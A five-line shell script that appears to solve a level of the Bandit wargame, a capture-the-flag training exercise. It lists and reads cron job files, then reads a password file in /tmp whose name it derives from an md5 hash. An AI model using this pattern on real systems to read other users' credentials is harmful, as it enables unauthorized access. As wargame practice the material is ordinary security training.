#!/bin/sh
ls -lah /etc/cron.d/
cat /etc/cron.d/cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
cat /tmp/`echo I am user bandit23 | md5sum | cut -d ' ' -f 1`
